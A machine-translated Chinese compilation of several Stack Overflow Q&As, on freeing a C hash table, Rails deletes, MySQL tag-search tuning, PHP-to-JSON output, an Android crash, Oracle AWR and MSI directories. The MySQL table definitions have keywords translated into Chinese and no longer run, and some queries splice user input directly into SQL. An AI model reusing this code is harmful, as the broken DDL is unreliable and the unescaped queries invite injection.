我认为我在正确的轨道上，我正在遍历哈希表中的每个索引，然后从一个状态到另一个状态并释放后缀。我不确定如何处理前缀，因为我必须先释放它们才能释放每个状态。任何帮助将不胜感激。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-04T19:23:43.633

在您的代码中，您正在复制到一个 temp3 节点，该节点位于自动内存中（“在堆栈上”），将 sp->suf 指向该内存将（在循环的下一次迭代中）导致 free 被调用地址这个对象（它*没有*被 malloc 获得，因此不能被 free() 释放）

```
void clean_up(State *sp)
{
State *temp;
Suffix *temp2, **pp;

for(int h = 0; h < NHASH; h++)
{
    for (sp = statetab[h]; sp != NULL; sp = sp->next)
    {
        for (pp = &sp->suf; *pp; *pp = temp2) 
        {
            temp2 = (*pp)->next;     
            free(*pp);
        }

    }
}
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-04T20:33:27.870

示例代码源自Kernighan 和 Pike 所著的[The Practice of Programming中的 Markov 程序，这是一本非常优秀的书。](http://www.cs.princeton.edu/~bwk/tpop.webpage/)

鉴于您正在尝试清理`statetab`，主要清理功能不需要任何参数。您必须小心不要直接`statetab`释放状态，但您确实需要释放链接的辅助状态`statetab[i].next`。

```
typedef struct State State;
typedef struct Suffix Suffix;

struct State {  /* prefix + suffix list */
char*   pref[NPREF];    /* prefix words */
Suffix* suf;            /* list of suffixes */
State*  next;           /* next in hash table */
};

struct Suffix { /* list of suffixes */
char*   word;           /* suffix */
Suffix* next;           /* next in list of suffixes */
};

State* statetab[NHASH]; /* hash table of states */

static void free_state(State *state);
static void free_suffix(Suffix *suffix);

static void cleanup(void)
{
   for (int i = 0; i < NHASH; i++)
      free_state(statetab[i]);
}

static void free_state(State *state)
{
    if (state != 0)
    {
        for (int i = 0; i < NPREF; i++)
            free(state->pref[i]);
        free_suffix(state->suf);
        if (state->next != 0)
        {
            free_state(state->next);
            free(state->next);
        }
    }
}

static void free_suffix(Suffix *suffix)
{
    if (suffix != 0)
    {
        free(suffix->word);
        free_suffix(suffix->next);
        free(suffix);
    }
} 
```

你看到我是如何`free_xxxx()`根据结构的设计来设计代码的`xxxx`吗？

*警告讲师*：未编译的代码，更少的测试代码。

* * *

我从 TPOP 站点挖出代码，并尝试应用它。我对上面的释放代码进行了一些修复（修复了语法错误，检查了 null`free_state()`和`free_suffix()`），但整个代码的设计目的并不是为了释放数据。

有几个问题。首先，一些前缀没有分配（NONWORD）。可以通过测试前缀是否为 NONWORD 来避免释放它们，但这很讨厌。也可以分配这些前缀（将 NONWORD 替换为`estrdup(NONWORD)`）。我认为在另一个地方，某个未分配的指针被隐藏在状态表的前缀中；我在`malloc()`抱怨“释放未分配的内存”时遇到崩溃（我相信这与“双重释放分配的内存”不同），但我没有设法解决这个问题。

但是，这会变成另一个问题；前缀被重用。也就是说，系统中几乎每个前缀都被用作一个前缀的第二个单词，然后作为下一个前缀的第一个单词。因此，您不能轻易释放前缀。

如果您要设计它以便释放内存，那么您可能会设计它以便有一个“原子”（不可变字符串）系统，这样每个单词都被分配一次并根据需要经常重复使用（参见[C Interfaces and Implementations: Techniques for Creating Reusable Code](https://rads.stackoverflow.com/amzn/click/com/0201498413) by D Hanson 作为术语的来源）。释放状态表的代码将只关注非字数据。也会有代码来释放完整的原子集。

`valgrind`我在没有清理的情况下运行了马尔可夫程序；没有内存访问问题，也没有数据泄露；在程序退出时仍然可以访问它。我使用了一个大约 15,000 个单词（以及大约 2900 个不同的单词）的数据文件，统计数据是：

```
==9610== HEAP SUMMARY:
==9610==     in use at exit: 695,269 bytes in 39,567 blocks
==9610==   total heap usage: 39,567 allocs, 0 frees, 695,269 bytes allocated
==9610== 
==9610== LEAK SUMMARY:
==9610==    definitely lost: 0 bytes in 0 blocks
==9610==    indirectly lost: 0 bytes in 0 blocks
==9610==      possibly lost: 0 bytes in 0 blocks
==9610==    still reachable: 695,269 bytes in 39,567 blocks 
```

所以，你给自己设置了一个有趣的练习。但是，我认为如果不重新设计一些内存分配机制以便可以干净地释放数据，这是无法实现的。

（在 BSD 上，因此在 Mac OS X 上，也有一对函数在`<stdlib.h>`被调用`setprogname()`和`getprogname()`中。在 BSD 上，在开始`setprogname()`之前被自动调用`main()`（`argv[0]`我相信`eprintf.h`使用`<stdlib.h>`这就是为什么问题中的代码使用`setProgName()`而不是原始代码的原因`setprogname()`。我选择修复`setprogname()`，`eprintf.h`以便它接受一个`const char *`参数，因此与中的声明相匹配`<stdlib.h>`。）

* * *

^(*TPOP 以前位于 [http://plan9.bell-labs.com/cm/cs/tpop](http://plan9.bell-labs.com/cm/cs/tpop)和 [http://cm.bell-labs.com/cm/cs/tpop](http://cm.bell-labs.com/cm/cs/tpop)但现在都在 (2015-08-10)破碎的。另请参阅关于[TPOP](https://en.wikipedia.org/wiki/The_Practice_of_Programming)*的 Wikipedia 。)

# ruby-on-rails - 删除数据库中的最后一条记录

> ID：13221131
> 
> 赞同：1
> 
> 时间：2012-11-04T17:42:55.910
> 
> 标签：ruby-on-rails, erb

我正在尝试删除最后一个数据库记录，但是当我按下链接时，页面只是刷新并且我什么也没得到：/

这是我的控制器：

```
 def delete
    @todo_items = Todo.last
    @todo_items.delete
  end 
```

&这是我的看法

```
<h1>Shared Todo App</h1>
  <p>All your todos here</p>
<% @todo_items.each do |t| %>
<li><%= t.todo_item %>
<% end %>

  <%= link_to 'Delete', todo_item, confirm: 'Are you sure?', method: :delete %> 
```

有任何想法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2014-02-15T19:31:39.570

[遵循相同的教程](http://www.codelearn.org/ruby-on-rails-tutorial/how-to-add-actions-views-in-rails)时，我遇到了同样的错误

我将控制器更改为：

```
def destroy
@todo_items = Todo.last
@todo_items.destroy
end 
```

并将我的视图名称更改为destroy.html.erb。

这似乎对我有用。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-04T18:06:33.477

首先，您的操作名称应该是`destroy`，而不是`delete`。默认情况下，带有`method: :delete`will 的链接映射到名为 的操作`destroy`。有关详细信息，请参阅本[指南](http://guides.rubyonrails.org/routing.html)。

其次，您可能希望在`destroy`操作结束时重定向某个地方。例如`redirect_to root_path`， 或任何合适的。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-04T20:06:54.653

如前所述，您的操作应该称为销毁，但这不是这里的问题。如果页面只是刷新，这意味着它没有调用 DELETE 方法，否则你应该看到一个“找不到动作”错误或者 Rails 应该运行默认的销毁方法。

您的问题可能与javascript有关。确保您已启用它并且在 application.html.erb 页面上您具有以下导入：

```
<%= javascript_include_tag :all %> 
```

或者至少是 rails.js 文件，它是在您更改默认方法时使 link_to 方法起作用的文件：

```
<%= javascript_include_tag "rails" %> 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-04T18:05:40.827

控制器动作应该是`:destroy`

```
def destroy
  @todo_items = Todo.last
  @todo_items.delete
end 
```

因为 Rails 有 7 个动作，其中包括：`new`、`show`、`edit`、`index`和.`destroy``update`

因此请求将`destroy`采取行动。所以试试这个，这会奏效。

# mysql - 如何优化两个表的搜索？

> ID：13221136
> 
> 赞同：1
> 
> 时间：2012-11-04T17:43:07.737
> 
> 标签：mysql, search, optimization

我有两张桌子：

第一个：

```
    如果不存在“标签”，则创建表（
  `i` int(10) NOT NULL AUTO_INCREMENT,
  `id` int(10) NOT NULL,
  `k` varchar(32) 整理 utf8_bin 不为空，
  主键 (`i`),
  键`k`（`k`）
) 引擎=MyISAM 默认字符集=utf8 排序=utf8_bin AUTO_INCREMENT=1505426 ；

```

第二：

```
如果不存在则创建表 `w` (
  `id` int(7) NOT NULL,
  `title` varchar(255) 整理 utf8_bin 不为空，
  `k1` varchar(24) 整理 utf8_bin 不为空，
  `k2` varchar(24) 整理 utf8_bin 不为空，
  `k3` varchar(24) 整理 utf8_bin 不为空，
  `k4` varchar(24) 整理 utf8_bin 不为空，
  `k5` varchar(24) 整理 utf8_bin 不为空，
  `k6` varchar(24) 整理 utf8_bin 不为空，
  `k7` varchar(24) 整理 utf8_bin 不为空，
  `k8` varchar(24) 整理 utf8_bin 不为空，
  `w` int(5) NOT NULL,
  `h` int(5) NOT NULL,
  `s` varchar(32) 整理 utf8_bin 不为空，
  `r` varchar(11) 整理 utf8_bin 不为空，
  `v` int(7) 非空，
  `c` varchar(32) 整理 utf8_bin 不为空，
  `c1` varchar(6) 整理 utf8_bin 不为空，
  `c2` varchar(6) 整理 utf8_bin 不为空，
  `c3` varchar(6) 整理 utf8_bin 不为空，
  `c4` varchar(6) 整理 utf8_bin 非空，
  `c5` varchar(6) 整理 utf8_bin 不为空，
  `c6` varchar(6) 整理 utf8_bin 不为空，
  `m` varchar(4) 整理 utf8_bin 不为空，
  `t` int(10) 非空，
  `i` int(6) NOT NULL,
  `o` int(6) NOT NULL,
  `f` varchar(255) 整理 utf8_bin 不为空，
  主键（`id`），
  KEY `keywords` (`k1`,`k2`,`k3`,`k4`,`k5`,`k6`,`k7`,`k8`),
  KEY `category` (`c`),
  KEY `color1` (`c1`)
) 引擎=InnoDB 默认字符集=utf8 排序=utf8_bin ROW_FORMAT=DYNAMIC；
```

I'm trying to search 2 words ($search1 + $search2) from table 'tags' and find id's at 'w' table. query:

```
SELECT w.id,w.title,w.k1,w.k2,w.k3,w.k4,w.k5,w.k6,w.k7,w.w,w.h,w.s,w.c1,w.c2,w.c3,w.c4,w.c5,w.c6,w.m,w.f
FROM tags,tags as tags2,w
WHERE tags.k ='$search1' AND tags2.k = '$search2'
and tags.id = tags2.id and tags2.id = w.id
ORDER BY `w`.`id`desc limit 24
```

The problem is that EXPLAIN function shows "Using where; Using temporary; Using filesort" Also I believe that there is another way to optimize this my type search system. Actually all data is in 'w' table, I just have no idea how exactly to search it properly. I would be grateful for any help.

**Edit**:a bit more information about this

table 'tags' 1505425 records InnoDB = 65,9 MiB

table 'w' 398900 rercords, InnoDB = 140,3 MiB

after this (**updated**) query:

```
select `w`.`id` AS `id`,`w`.`title` AS `title`,`w`.`k1` AS `k1`,`w`.`k2` AS `k2`,`w`.`k3` AS `k3`,`w`.`k4` AS `k4`,`w`.`k5` AS `k5`,`w`.`k6` AS `k6`,`w`.`k7` AS `k7`,`w`.`k8` AS `k8`,`w`.`w` AS `w`,`w`.`h` AS `h`,`w`.`s` AS `s`,`w`.`c1` AS `c1`,`w`.`c2` AS `c2`,`w`.`c3` AS `c3`,`w`.`c4` AS `c4`,`w`.`c5` AS `c5`,`w`.`c6` AS `c6`,`w`.`m` AS `m`,`w`.`f` AS `f` from `tags` join `tags` `tags2` join `w` where ((`tags`.`k` = '$search1') and (`tags2`.`id` = `tags`.`id`) and (`w`.`id` = `tags`.`id`) and (`tags2`.`k` = '$search2')) order by `tags`.`i` desc limit 0,24;
```

mysql still shows:

```
+----+-------------+------------+--------+---------------+---------+---------+-------------+------+----------+-----------------------------+
| id | select_type | table      | type   | possible_keys | key     | key_len | ref         | rows | filtered | Extra                       |
+----+-------------+------------+--------+---------------+---------+---------+-------------+------+----------+-----------------------------+
|  1 | SIMPLE      | tags       | ref    | k,id          | k       | 98      | const       |  902 |   100.00 | Using where; Using filesort |
|  1 | SIMPLE      | tags2      | ref    | k,id          | id      | 4       | db.tags.id  |    4 |   100.00 | Using where                 |
|  1 | SIMPLE      | w          | eq_ref | PRIMARY       | PRIMARY | 4       | db.tags2.id |    1 |   100.00 | Using where                 |
+----+-------------+------------+--------+---------------+---------+---------+-------------+------+----------+-----------------------------+
3 rows in set, 1 warning (0.00 sec)一个警告，仍然一切都保持不变，有没有更好的性能解决方案？目前它工作正常，但我认为以后一切都会变得越来越慢。
            回答 #1

赞同：1

时间：2012-11-04T18:05:04.477

您正在混合存储引擎；mySQL 很难跨存储引擎连接表。

前：

```
mysql> explain SELECT w.id,w.title,w.k1,w.k2,w.k3,w.k4,w.k5,w.k6,w.k7,w.w,w.h,w.s,w.c1,w.c2,w.c3,w.c4,w.c5,w.c6,w.m,w.f FROM tags,tags as tags2,w WHERE tags.k ='$search1' AND tags2.k = 'search2' and tags.id = tags2.id and tags2.id = w.id ORDER BY `w`.`id`desc limit 24;
+----+-------------+-------+--------+---------------+---------+---------+-------------+------+----------------------------------------------+
| id | select_type | table | type   | possible_keys | key     | key_len | ref         | rows | Extra                                        |
+----+-------------+-------+--------+---------------+---------+---------+-------------+------+----------------------------------------------+
|  1 | SIMPLE      | tags  | ref    | k             | k       | 98      | const       |    1 | Using where; Using temporary; Using filesort |
|  1 | SIMPLE      | tags2 | ref    | k             | k       | 98      | const       |    1 | Using where                                  |
|  1 | SIMPLE      | w     | eq_ref | PRIMARY       | PRIMARY | 4       | tmp.tags.id |    1 |                                              |
+----+-------------+-------+--------+---------------+---------+---------+-------------+------+----------------------------------------------+ 
```

将 w 更改为 MyISAM：

```
mysql> alter table w engine MyISAM;
Query OK, 1 row affected (0.01 sec)
Records: 1  Duplicates: 0  Warnings: 0 
```

后：

```
mysql> explain SELECT w.id,w.title,w.k1,w.k2,w.k3,w.k4,w.k5,w.k6,w.k7,w.w,w.h,w.s,w.c1,w.c2,w.c3,w.c4,w.c5,w.c6,w.m,w.f FROM tags,tags as tags2,w WHERE tags.k ='$search1' AND tags2.k = 'search2' and tags.id = tags2.id and tags2.id = w.id ORDER BY `w`.`id`desc limit 24;
+----+-------------+-------+--------+---------------+------+---------+-------+------+-------------+
| id | select_type | table | type   | possible_keys | key  | key_len | ref   | rows | Extra       |
+----+-------------+-------+--------+---------------+------+---------+-------+------+-------------+
|  1 | SIMPLE      | w     | system | PRIMARY       | NULL | NULL    | NULL  |    1 |             |
|  1 | SIMPLE      | tags  | ref    | k             | k    | 98      | const |    1 | Using where |
|  1 | SIMPLE      | tags2 | ref    | k             | k    | 98      | const |    1 | Using where |
+----+-------------+-------+--------+---------------+------+---------+-------+------+-------------+
3 rows in set (0.00 sec) 
```

            回答 #2

赞同：0

时间：2012-11-04T23:14:00.437

Vagiz，您更新的查询似乎没问题：

```
select `w`.`id` AS `id`,`w`.`title` AS `title`,`w`.`k1` AS `k1`,`w`.`k2` AS `k2`,
`w`.`k3` AS `k3`,`w`.`k4` AS `k4`,`w`.`k5` AS `k5`,`w`.`k6` AS `k6`,`w`.
`k7` AS `k7`,`w`.`k8` AS `k8`,`w`.`w` AS `w`,`w`.`h` AS `h`,`w`.`s` AS `s`,
`w`.`c1` AS `c1`,`w`.`c2` AS `c2`,`w`.`c3` AS `c3`,`w`.`c4` AS `c4`,
`w`.`c5` AS `c5`,`w`.`c6` AS `c6`,`w`.`m` AS `m`,`w`.`f` AS `f`
from `tags` join `tags` `tags2` join `w` where ((`tags`.`k` = '$search1') 
and (`tags2`.`id` = `tags`.`id`) and (`w`.`id` = `tags`.`id`) 
and (`tags2`.`k` = '$search2')) order by `tags`.`i` desc limit 0,24; 
```

如果它产生以下解释结果：

```
+----+-------------+------------+--------+---------------+---------+---------+-------------+------+----------+-----------------------------+
| id | select_type | table      | type   | possible_keys | key     | key_len | ref         | rows | filtered | Extra                       |
+----+-------------+------------+--------+---------------+---------+---------+-------------+------+----------+-----------------------------+
|  1 | SIMPLE      | tags       | ref    | k,id          | k       | 98      | const       |  902 |   100.00 | Using where; Using filesort |
|  1 | SIMPLE      | tags2      | ref    | k,id          | id      | 4       | db.tags.id  |    4 |   100.00 | Using where                 |
|  1 | SIMPLE      | w          | eq_ref | PRIMARY       | PRIMARY | 4       | db.tags2.id |    1 |   100.00 | Using where                 |
+----+-------------+------------+--------+---------------+---------+---------+-------------+------+----------+-----------------------------+
3 rows in set, 1 warning (0.00 sec) 
```

不用担心文件排序和性能。来自[Mysql 性能博客](http://www.mysqlperformanceblog.com/2009/03/05/what-does-using-filesort-mean-in-mysql/)：

事实是，文件排序的名字很糟糕。任何时候无法从索引执行排序，它都是文件排序。它与文件无关。文件排序应该称为“排序”。它本质上是快速排序。

```

# php - 将 mysql 结果重新排列为 hansontable 的预期格式

> ID：13221142
> 
> 赞同：0
> 
> 时间：2012-11-04T17:43:32.330
> 
> 标签：php, mysql, json

我将使用 hansontable 的格式将 mysql 结果重新排列为 json。根据这个问题：[查找字符串位置并加入另一个表的行](https://stackoverflow.com/questions/13218232/find-string-position-and-join-another-tables-row/13218284#comment18001930_13218284)。奥拉夫先生有他的天赋。我试过自己做。是的，再次 - 它不起作用。这是我的代码：

```
$sql_rCost="select date,
       substring_index(cost, '-', 1) type_a,
       case when cost regexp '.*-' then
                 substring_index(substring_index(cost, '-', 2), '-', -1)
            else ''
       end type_b,
       case when cost regexp '.*-.*-' th                substring_index(substring_index(cost, '-', 3), '-', -1)
            else ''
       end type_c,
       case when cost regexp '.*-.*-.*-' then
            substring_index(substring_index(cost, '-', 4), '-', -1)
            else ''
       end type_d,
       case when cost regexp '.*-.*-.*-.*-' then
            substring_index(substring_index(cost, '-', 5), '-', -1)
            else ''
       end type_e
from room_rate_cost where rate='2' and  hotel='1' and date between '2012-11-01' and '2012-11-31' order by date asc
";
$result_rCost=mysql_db_query($dbname,$sql_rCost);
while($rec_rCost=mysql_fetch_array($result_rCost)){
    $_rCostDBdate=$rec_rCost['date'];
    $_rCostDBtypea=$rec_rCost['type_a'];
    $_rCostDBtypeb=$rec_rCost['type_b'];
    $_rCostDBtypec=$rec_rCost['type_c'];
    $_rCostDBtyped=$rec_rCost['type_d'];
    $_rCostDBtypee=$rec_rCost['type_e'];

    $_rCostDBcost[]=$rec_rCost['cost'];

    $_array[]=array(    $_rCostDBdate,$_rCostDBcost);
}
    echo "{\"data\": [".json_encode($_array)."]}"; 
```

执行后返回：

```
{"data": [[["2012-11-01",[null]],["2012-11-02",[null,null]],["2012-11-03",[null,null,null]],["2012-11-04",[null,null,null,null]],["2012-11-05",[null,null,null,null,null]],["2012-11-06",[null,null,null,null,null,null]],["2012-11-07",[null,null,null,null,null,null,null]],["2012-11-08",[null,null,null,null,null,null,null,null]],["2012-11-09",[null,null,null,null,null,null,null,null,null]],["2012-11-10",[null,null,null,null,null,null,null,null,null,null]],["2012-11-11",[null,null,null,null,null,null,null,null,null,null,null]],["2012-11-12",[null,null,null,null,null,null,null,null,null,null,null,null]],["2012-11-13",[null,null,null,null,null,null,null,null,null,null,null,null,null]],["2012-11-14",[null,null,null,null,null,null,null,null,null,null,null,null,null,null]],["2012-11-15",[null,null,null,null,null,null,null,null,null,null,null,null,null,null,null]],["2012-11-16",[null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null]],["2012-11-17",[null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null]],["2012-11-18",[null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null]],["2012-11-19",[null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null]],["2012-11-20",[null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null]],["2012-11-21",[null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null]],["2012-11-22",[null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null]],["2012-11-23",[null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null]],["2012-11-24",[null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null]],["2012-11-25",[null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null]],["2012-11-26",[null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null]],["2012-11-27",[null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null]],["2012-11-28",[null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null]],["2012-11-29",[null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null]],["2012-11-30",[null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null]]]]} 
```

预期的格式是：

```
 {
  "data": [
    ["", "type_a", "type_b", "type_c", "type_d", "type_e"],
    ["2011-11-01", 4700, 5500, 6100, 6600, 7300],
    ["2011-11-02", 4700, 5500, 6100, 6600, 7300],
    ["2011-11-03", 4700, 5500, 6100, 6600, 7300],
    ...
    ["2011-11-30", 4700, 5500, 6100, 6600, 7300],
  ]
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-04T19:17:22.997

I would change the array creation from:

```
$_array[]=array($_rCostDBdate,$_rCostDBcost); 
```

to:

```
$_array[]=array($_rCostDBdate, $_rCostDBtypea, $_rCostDBtypeb, $_rCostDBtypec,
                $_rCostDBtyped, $_rCostDBtypee); 
```

and would leave out the line:

```
$_rCostDBcost[]=$rec_rCost['cost']; 
```

since in the query result, there is no column named `cost`.

If you change the query to `mysql_fetch_array($result_rCost, MYSQL_NUM)`, you could reduce the loop to just:

```
while ($rec_rCost = mysql_fetch_array($result_rCost,  MYSQL_NUM)) {
    $_array[] = $rec_rCost;
} 
```

**Update**: To add the header line, just insert before the loop:

```
$_array[] = array('', 'type_a', 'type_b', 'type_c', 'type_d', 'type_e'); 
```

# android - ActionBarSherlock Tabs 空点异常

> ID：13221143
> 
> 赞同：1
> 
> 时间：2012-11-04T17:43:47.107
> 
> 标签：android, nullpointerexception, actionbarsherlock

我有两种方法：

```
private void openPrivate(String target) {
    currentKeyWindows = target;
    Log.i("better","openPrivate "+ target);
    if (windows.containsKey(currentKeyWindows)) {
    } else {
        tw = createTextView(currentKeyWindows);

        ActionBar.Tab newTab = getSupportActionBar().newTab();
        newTab.setText(currentKeyWindows);
        newTab.setTabListener(MainActivity.this);

        getSupportActionBar().addTab(newTab, true);
    }
}

private void jointochannel(String target) {
    currentKeyWindows = "#" + target;
    Log.i("better","jointochannel "+ target);
    if (windows.containsKey(currentKeyWindows)) {
    } else {
        tw = createTextView(currentKeyWindows);
        listofnicks.put(currentKeyWindows, new ArrayList<String>());
        nicklistadapter = new ArrayAdapter<String>(this, R.xml.mylistview, listofnicks.get(currentKeyWindows));
        nicklist.setAdapter(nicklistadapter);

                registerForContextMenu(nicklist);  

        ActionBar.Tab newTab = getSupportActionBar().newTab();
        newTab.setText(currentKeyWindows);
        newTab.setTabListener(MainActivity.this);

        getSupportActionBar().addTab(newTab, true);
        irc.addCommand(new Command(Command.JOIN_TO_CHANNEL, "JOIN " + currentKeyWindows));
    }
            channel = currentKeyWindows;
} 
```

第二种方法效果很好。第一种方法（openPrivate）以空点异常结束：

```
getSupportActionBar().addTab(newTab, true); 
```

我的 AndroidManifest.xml：

```
<application
    android:icon="@drawable/ic_launcher"
    android:label="@string/app_name"
    android:theme="@style/AppTheme" > 
```

该怎么办？为什么相同的代码工作方式不同？问候，丹尼斯。

日志猫：

```
11-04 17:06:57.241: E/AndroidRuntime(4696): FATAL EXCEPTION: main
11-04 17:06:57.241: E/AndroidRuntime(4696): java.lang.NullPointerException
11-04 17:06:57.241: E/AndroidRuntime(4696):     at android.widget.ArrayAdapter.getCount(ArrayAdapter.java:291)
11-04 17:06:57.241: E/AndroidRuntime(4696):     at android.widget.ListView.setAdapter(ListView.java:454)
11-04 17:06:57.241: E/AndroidRuntime(4696):     at ru.startandroid.develop.MainActivity.onTabSelected(MainActivity.java:427)
11-04 17:06:57.241: E/AndroidRuntime(4696):     at com.actionbarsherlock.internal.app.ActionBarImpl.selectTab(ActionBarImpl.java:526)
11-04 17:06:57.241: E/AndroidRuntime(4696):     at com.actionbarsherlock.internal.app.ActionBarImpl.addTab(ActionBarImpl.java:452)
11-04 17:06:57.241: E/AndroidRuntime(4696):     at ru.startandroid.develop.MainActivity.openPrivate(MainActivity.java:382)
11-04 17:06:57.241: E/AndroidRuntime(4696):     at ru.startandroid.develop.MainActivity.onContextItemSelected(MainActivity.java:100)
11-04 17:06:57.241: E/AndroidRuntime(4696):     at android.app.Activity.onMenuItemSelected(Activity.java:2209)
11-04 17:06:57.241: E/AndroidRuntime(4696):     at com.android.internal.policy.impl.PhoneWindow$ContextMenuCallback.onMenuItemSelected(PhoneWindow.java:2785)
11-04 17:06:57.241: E/AndroidRuntime(4696):     at com.android.internal.view.menu.MenuItemImpl.invoke(MenuItemImpl.java:143)
11-04 17:06:57.241: E/AndroidRuntime(4696):     at com.android.internal.view.menu.MenuBuilder.performItemAction(MenuBuilder.java:855)
11-04 17:06:57.241: E/AndroidRuntime(4696):     at com.android.internal.view.menu.MenuDialogHelper.onClick(MenuDialogHelper.java:137)
11-04 17:06:57.241: E/AndroidRuntime(4696):     at com.android.internal.app.AlertController$AlertParams$3.onItemClick(AlertController.java:873)
11-04 17:06:57.241: E/AndroidRuntime(4696):     at android.widget.AdapterView.performItemClick(AdapterView.java:284)
11-04 17:06:57.241: E/AndroidRuntime(4696):     at android.widget.ListView.performItemClick(ListView.java:3513)
11-04 17:06:57.241: E/AndroidRuntime(4696):     at android.widget.AbsListView$PerformClick.run(AbsListView.java:1812)
11-04 17:06:57.241: E/AndroidRuntime(4696):     at android.os.Handler.handleCallback(Handler.java:587)
11-04 17:06:57.241: E/AndroidRuntime(4696):     at android.os.Handler.dispatchMessage(Handler.java:92)
11-04 17:06:57.241: E/AndroidRuntime(4696):     at android.os.Looper.loop(Looper.java:130)
11-04 17:06:57.241: E/AndroidRuntime(4696):     at android.app.ActivityThread.main(ActivityThread.java:3683)
11-04 17:06:57.241: E/AndroidRuntime(4696):     at java.lang.reflect.Method.invokeNative(Native Method)
11-04 17:06:57.241: E/AndroidRuntime(4696):     at java.lang.reflect.Method.invoke(Method.java:507)
11-04 17:06:57.241: E/AndroidRuntime(4696):     at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:839)
11-04 17:06:57.241: E/AndroidRuntime(4696):     at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:597)
11-04 17:06:57.241: E/AndroidRuntime(4696):     at dalvik.system.NativeStart.main(Native Method) 
```

onTabSelected（Tab 选项卡，FragmentTransaction ft）：

```
 public void onTabSelected(Tab tab, FragmentTransaction ft)
{
    currentKeyWindows = tab.getText().toString();

    mScrollView.removeAllViews();
    mScrollView.addView(this.windows.get(this.currentKeyWindows));
    scrollToBottom();

    nicklistadapter = new ArrayAdapter<String>(this, R.xml.mylistview, listofnicks.get(currentKeyWindows));
    nicklist.setAdapter(nicklistadapter);

    registerForContextMenu(nicklist);  
    channel=currentKeyWindows;

} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-04T18:19:31.710

从您的 LogCat 来看，您传递给适配器的数组似乎是`null`：

```
nicklistadapter = new ArrayAdapter<String>(this, R.xml.mylistview, listofnicks.get(currentKeyWindows)); 
```

我将验证是否`listofnicks.get(currentKeyWindows)`返回有效结果。

# performance - Oracle10g AWR 如何衡量将表空间拆分为多个磁盘卷后的改进？

> ID：13221144
> 
> 赞同：0
> 
> 时间：2012-11-04T17:43:49.307
> 
> 标签：performance, oracle, testing, awr

我最近发布了一个 10 000 用户分析应用程序，由于交易量过多，该应用程序遇到了性能问题。除了重写应用程序中的许多 SQL 以获得更好的性能外，我们还采用自上而下的方法，我们向内存中添加更多的卷和 tweek 等。Oracle 专家将我们的服务器从具有 2 个卷的单个表空间重新设计为 2 个表空间有 4 个卷，其中索引将有自己的卷和表空间。每个卷都是一个单独的磁盘阵列，因此它们不会竞争 IO。

我们已经在开发环境中执行了这种更改，我们即将接受，但在为更改付费之前，企业希望看到可衡量的收益。

**我可以在 AWR 报告中的哪个位置进行比较以测量执行更改前后的此类数据？**

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-04T21:57:28.197

AWR 有一个称为[IO Stats](http://www.oracle-base.com/articles/10g/awrrpt_demo.html#24)的部分。并非没有道理，这是它报告 IO 活动统计信息的地方。[在该部分中，每个表空间](http://www.oracle-base.com/articles/10g/awrrpt_demo.html#1700)都有数字。您需要针对目标数据库运行这些报告。理想情况下，您需要进行几次不同的跑步，每次跑步不超过 20 分钟；运行时间越长，平均定律就越有可能从你得到的数据中汲取意义。

因此，原则是：您运行此报告并获得基准。然后部署更改并重新运行报告。各个列的不同之处在于更改的性能优势。实际上，您会希望每秒的请求和数据增加，平均时间和等待时间减少。

为了使这些数字更有说服力，您应该在测试前后运行相同的工作负载。这就是真正应用测试之类的东西真正发挥作用的地方。

# windows - windows 安装程序 msi 包：在 DefaultDir 列中输入的句点 (.)

> ID：13221147
> 
> 赞同：1
> 
> 时间：2012-11-04T17:44:14.733
> 
> 标签：windows, windows-installer

我想知道这实际上意味着什么：

> 对于非根源目录，在源目录名称或目标目录名称的 DefaultDir 列中输入句点 (.) 表示该目录应位于其父目录中，不包含子目录。

你也能给我举个例子吗？谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-05T19:21:11.430

Directory 表的每一行都指示安装源和目标的目录。

在 MSDN 文档中有使用 (.) 和 (:) 语法功能的示例，这些功能显示填充的[目录表](http://msdn.microsoft.com/En-US/Library/Windows/Desktop/eaca30cb-fec1-49ca-8b23-5e54c583e3e2)和解析的路径：[使用目录表](http://msdn.microsoft.com/En-US/Library/Windows/Desktop/3f2e1cc2-6b36-4615-86e6-e78485edd2f7)

[主题指定目录结构](http://msdn.microsoft.com/En-US/Library/Windows/Desktop/31390138-b1d0-4f0b-9304-6e7c69e6a736)中还有一个目录表示例，它对应于主题[规划安装](http://msdn.microsoft.com/En-US/Library/Windows/Desktop/8b0fb473-e19f-4427-b2a1-d0721cde9d38)中描述的布局。

# sql - 我怎样才能加入不重复？

> ID：13221154
> 
> 赞同：0
> 
> 时间：2012-11-04T17:44:44.720
> 
> 标签：sql, sql-server, join, left-join, outer-join

